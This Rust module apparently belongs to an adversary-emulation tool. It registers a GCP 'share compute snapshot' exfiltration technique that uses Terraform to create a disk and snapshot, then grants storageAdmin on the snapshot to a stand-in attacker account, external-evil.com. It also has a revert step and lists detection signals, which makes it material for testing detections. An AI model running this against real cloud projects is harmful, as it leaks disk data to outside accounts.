use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    google = { source = "hashicorp/google", version = "~> 4.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

variable "project_id" {}

provider "google" { project = var.project_id }

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "google_compute_disk" "disk" {
  name  = "stratus-disk-${random_string.suffix.result}"
  type  = "pd-standard"
  zone  = "us-central1-a"
  size  = 10
}

resource "google_compute_snapshot" "snapshot" {
  name        = "stratus-snapshot-${random_string.suffix.result}"
  source_disk = google_compute_disk.disk.self_link
  zone        = google_compute_disk.disk.zone
}

output "snapshot_name" { value = google_compute_snapshot.snapshot.name }
"#;

const ATTACKER_ACCOUNT: &str = "user:attacker@external-evil.com";

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let snapshot_name = outputs
        .get("snapshot_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: snapshot_name"))?;

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/global/snapshots/{}/setIamPolicy",
        project, snapshot_name
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": [{
                "role": "roles/compute.storageAdmin",
                "members": [ATTACKER_ACCOUNT]
            }]
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!(
            "Shared snapshot '{}' with '{}' — attacker can now create disks from this snapshot",
            snapshot_name, ATTACKER_ACCOUNT
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to set snapshot IAM policy ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let snapshot_name = outputs
        .get("snapshot_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: snapshot_name"))?;

    let url = format!(
        "https://compute.googleapis.com/compute/v1/projects/{}/global/snapshots/{}/setIamPolicy",
        project, snapshot_name
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": []
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!("Removed attacker IAM binding from snapshot '{}'", snapshot_name);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to remove snapshot IAM binding ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.exfiltration.share-compute-snapshot",
        friendly_name: "Share GCP Compute Snapshot with External Account",
        description: "Sets an IAM policy on a GCP disk snapshot granting an external attacker account storageAdmin access, enabling disk data exfiltration by creating a disk from the snapshot.",
        detection: "GCP Audit Log: compute.snapshots.setIamPolicy with external member. Cloud Security Command Center: Snapshot shared externally alert.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
